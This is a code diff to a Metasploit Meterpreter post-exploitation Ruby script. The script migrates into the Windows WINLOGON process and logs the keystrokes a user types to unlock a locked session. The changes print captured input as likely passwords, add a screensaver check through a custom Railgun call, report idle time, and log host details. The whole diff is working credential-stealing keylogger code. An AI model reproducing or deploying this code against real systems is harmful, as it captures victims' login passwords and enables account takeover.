@@ -101,10 +101,24 @@ def keycap(session, keytime, logfile)
 			end
 			sleep(2)
 			file_local_write(logfile,"#{outp}\n")
-			still_locked = client.railgun.user32.GetForegroundWindow()['return']
+			if outp != nil and outp.chomp.lstrip != "" then
+				print_status("Password?: #{outp}")
+			end
+			still_locked = 1
+			# Check to see if the screen saver is on, then check to see if they have logged back in yet.
+			screensaver = client.railgun.user32.SystemParametersInfoA(114,nil,1,nil)['pvParam'].unpack("C*")[0]
+			if screensaver == 0
+				still_locked = client.railgun.user32.GetForegroundWindow()['return']
+			end
 			if still_locked == 0
-				print_status("They logged back in! Money time!")
+				print_status("They logged back in, the last password was probably right.")
 				raise 'win'
+			end
+			currentidle = session.ui.idle_time
+			if screensaver == 0
+				print_status("System has currently been idle for #{currentidle} seconds and the screensaver is OFF")
+			else
+				print_status("System has currently been idle for #{currentidle} seconds and the screensaver is ON")
 			end
 			sleep(keytime.to_i)
 		end
@@ -212,6 +226,23 @@ else
 	session.core.migrate(targetpid)
 	print_status("Migrated to WINLOGON PID: #{targetpid} successfully")
 end
+
+#Load user32 into Winlogon
+client.railgun.user32
+
+# Override SystemParametersInfo Railgun call to check for Screensaver
+# Unfortunately 'pvParam' changes it's type for each uiAction so
+# it cannot be changed in the regular railgun defs
+client.railgun.add_function('user32','SystemParametersInfoA','BOOL',[
+	["DWORD","uiAction","in"],
+	["DWORD","uiParam","in"],
+	["PBLOB","pvParam","out"],
+	["DWORD","fWinIni","in"]
+])
+
+
+print_good("Begginning keylogging on #{client.info}")
+file_local_write(logfile,"#{client.info}\n")
 
 if justwait then
 	print_status("Waiting for user to lock out their session")
